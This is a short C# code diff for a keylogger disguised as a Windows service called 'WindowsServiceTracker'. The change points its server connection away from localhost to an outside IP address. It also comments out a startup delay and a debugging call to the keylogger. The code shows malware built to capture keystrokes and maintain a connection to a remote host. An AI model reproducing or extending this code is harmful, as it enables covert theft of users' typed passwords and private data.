@@ -37,7 +37,7 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
 
         //Variables
-        private volatile String ipAddressString = "127.0.0.1";
+        private volatile String ipAddressString = "131.204.27.103";
         private long ipAddress = 0x0100007F; //default to local host
         private IPEndPoint ipPort;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
@@ -78,7 +78,7 @@ namespace WindowsServiceTracker
             //System.Diagnostics.Debugger.Launch();
 
             //Keep the service running for 15 seconds
-            Thread.Sleep(15000);
+            //Thread.Sleep(15000);
 
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
@@ -95,7 +95,7 @@ namespace WindowsServiceTracker
 
             CreateOpenPipe();
             keyLogFilePath = GetKeylogFilePath();
-            StartKeylogger(); //todo remove after debugging
+            //StartKeylogger(); //todo remove after debugging
 
             tcpThread = new Thread(this.MaintainServerConnection);
             tcpThread.Start();
